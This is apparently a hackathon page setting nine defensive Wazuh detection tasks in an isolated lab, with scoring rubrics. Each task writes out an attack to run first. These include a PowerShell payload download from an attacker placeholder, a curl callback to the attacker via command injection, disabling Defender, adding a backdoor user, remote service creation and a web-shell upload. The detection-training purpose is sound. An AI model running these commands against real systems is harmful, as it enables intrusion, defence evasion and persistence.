---
title: Challenges
parent: Cybersecurity
grand_parent: Hackathon Tracks
nav_order: 4
---

# Cybersecurity: Nine Defensive Lab Tasks

Select **two or three tasks** from the five Windows and four Linux cards below; you may use one platform or both. This is a task-based defensive track, not a set of difficulty tiers. The `B` suffixes are task identifiers, not score multipliers. Allow roughly 30-40 minutes for an initial detection, then time for validation, prevention and evidence.

Work **only inside the designated isolated lab and on explicitly authorized targets**. Build a Wazuh rule that detects the selected behavior, show its alert, explain the weakness and demonstrate appropriate prevention without breaking legitimate use. Follow the [authorized-scope and submission rules](rules.md).

Your selected task set is assessed once out of **100 points**, not per task. Approximately two to three judges may assess each team independently; their scores are averaged for ranking. The top three teams qualify for the Grand Finale. **No slides or formal pitch are required, and technical demonstrations have no presentation marks.**

Every challenge follows the same pattern:
1. **Run the attack** from your attacker VM.
2. **Watch Wazuh** — the right events arrive already decoded.
3. **Write a rule** that fires on the behaviour. Alert must carry the fields
   named in the card.
4. **Prove it isn't hardcoded** — the final round runs the same attack with
   something changed (different IP, different username, different filename).
   A rule containing a literal IP, username, or filename will fail.

---

## Windows

### W1B — Too many failed logins (easiest)

**Attack:** Brute-force RDP or SMB against the Windows target: 10–12 failed
logins against one account. Don't log in successfully — failures only.

**Build a rule that fires when:** 5+ failed logons (Event 4625) from the same
source IP within 2 minutes. Alert includes source IP and username.

Start from Wazuh's built-in rule 5710 and add a frequency block.

### W2B — PowerShell ran something odd

**Attack:** On the Windows target, run a PowerShell download:
`powershell -c "Invoke-WebRequest -Uri http://<attacker>/payload.txt -OutFile C:\Users\Public\payload.txt"`

**Build a rule that fires when:** PowerShell is launched with a command line
containing a download verb (`Invoke-WebRequest`, `DownloadFile`,
`DownloadString`, `curl`). Alert includes the full command line and the
parent process.

**Watch out:** the final round uses a different download cmdlet or `curl.exe`
instead of `Invoke-WebRequest`. Match the *family*, not one literal string.

### W3B — A new program was installed

**Attack:** Install a new Windows service from the attacker position:
`sc \\target create LabSvc binPath= C:\Users\Public\svc.exe`

**Build a rule that fires when:** a service is installed (Event 7045) with a
binary path **outside** `C:\Windows`. Your first negate condition. Alert
includes service name, path, account.

### W4B — Someone turned off the antivirus

**Attack:** Disable Windows Defender real-time monitoring:
`Set-MpPreference -DisableRealtimeMonitoring $true` — then re-enable it.

**Build a rule that fires when:** Defender real-time protection is disabled
(Event 5001). Optional extension: a second rule on the re-enable (Event 5000),
assessed within the same rubric rather than as bonus points.

You need to add the Defender operational channel to the agent's log
collection first — that's part of the challenge.

### W5B — File integrity monitoring on Windows

**Attack:** On the Windows target, tamper with a protected file —
copy `rubbish.exe` into the Startup folder, or drop a modified DLL next
to a legitimate application in `C:\Program Files\` (or edit a Run key).

**Build a rule that fires when:** a new file appears in a monitored
location (Startup folder, or any file change under a protected directory)
with the right severity. Windows FIM is built into the Wazuh agent —
`<syscheck>` config — so your job is: configure the monitored directories,
restart the agent, write a rule on the resulting syscheck events.

**Watch out:** the registry is part of file integrity too. Complete detection
evidence for this task also includes monitoring `HKLM\...\Run` and alerting on new values.
Pre-existing entries (OneDrive etc.) must NOT fire — the agent baselines
existing files at enrolment.

---

## Linux

### L1B — SSH brute force detection (easiest)

**Attack:** Brute-force SSH on the Linux target: 10–12 failed logins against
one user. Failures only.

**Build a rule that fires when:** 5+ SSH failures from one source IP within
2 minutes. Alert includes source IP and username. Mirror image of W1B —
start from built-in rule 5712.

### L2B — Someone edited the passwd file

**Attack:** Add a backdoor user: `useradd backdoor && passwd backdoor`

**Build a rule that fires when:** `/etc/passwd` or `/etc/shadow` changes.
Configure Wazuh FIM (syscheck) on those two files, then one rule.

**Most likely false positive:** none — file changes to these files are
genuinely rare. This is the cleanest first FIM exercise.

### L3B — A web shell appeared

**Attack:** Upload a PHP file through the DVWA upload function, then request
it once in your browser.

**Build a rule that fires when:** a file lands in the web upload directory
(FIM), or when a `.php`/`.phtml` file under an upload path is requested over
HTTP. Either signal provides partial detection evidence for this task; both
together provide complete coverage of the upload-and-request sequence.

### L4B — The web server called home

**Attack:** From the web app's command-injection, make the server connect
out to your attacker machine (`curl http://<attacker>:8000/`).

**Build a rule that fires when:** an outbound connection comes from the
web-server process (`www-data`) to anything non-local. The auditd rule to
feed Wazuh is pre-installed on the target — your job is the Wazuh rule on
top of it.

---

## Recommended pairings

- **Fastest confidence:** W1B + L1B (same skill, two platforms)
- **Detection + defence:** W1B + W4B, or L1B + L2B (one detection, one control)
- **Integrity focus:** W5B + L2B (Windows and Linux file monitoring)
- **Web attack story:** L3B + L4B (the drop, then the callback)

Two or three done properly beats nine rushed. Identify your selected task IDs
in the submission and explain your choices.

## Technical assessment checkpoints

These are the observable detection outcomes for the selected cards. For **each selected task**, also provide the rule/configuration, alert evidence, changed-input and benign tests, weakness explanation, and targeted prevention results required by the [100-point rubric](rules.md#judging-criteria).

| Task | Required detection evidence | Robustness checkpoint |
|---|---|---|
| W1B | Thresholded failed-logon alert containing source IP and username. | The stated time/count boundary is respected and another lab source or username still matches. |
| W2B | Download-behavior alert with full command line and parent process. | A different supported download command is detected without depending on one literal command or lab address. |
| W3B | Service-install event outside the Windows directory, with name, binary path and account. | A changed lab service/path is detected while legitimate Windows-path examples are distinguished. |
| W4B | Defender protection-disabled event from the required operational channel. | Verify event collection and alerting again after protection is restored; re-enable detection remains optional. |
| W5B | Protected-location file changes and new monitored Run-key values, with suitable event context/severity. | Changed filenames/values still alert, while pre-existing baseline entries do not generate false positives. |
| L1B | Thresholded SSH-failure alert with source IP and username. | Check the count/time boundary, a changed lab input and benign authentication activity. |
| L2B | FIM alerts for changes to the required account files. | Confirm both configured files are covered and preserve before/after evidence without exposing real credentials. |
| L3B | Evidence of both an uploaded web file and its HTTP request for complete sequence coverage. | A changed lab filename still matches; benign upload/request behavior is evaluated. |
| L4B | Alert linking a non-local outbound connection to the web-server process using supplied audit telemetry. | A changed authorized lab destination is detected without treating unrelated processes as the same behavior. |

| Criterion | Points |
|---|---:|
| Detection engineering | 25 |
| SIEM evidence quality | 25 |
| Vulnerability identification | 20 |
| Prevention and containment | 20 |
| Reporting and reproducibility | 10 |
| **Total for the selected task set** | **100** |

Complete and reproducible evidence can earn full credit for a requirement. Partial chains or inconsistent behavior earn partial credit; absent or unsupported work earns none for the affected requirement. Task count, presentation style and literal-value-only detections do not substitute for working defensive controls. See the [rules](rules.md#scoring-and-tie-breakers) for averaging, ranking, technical tie-breakers and qualification.
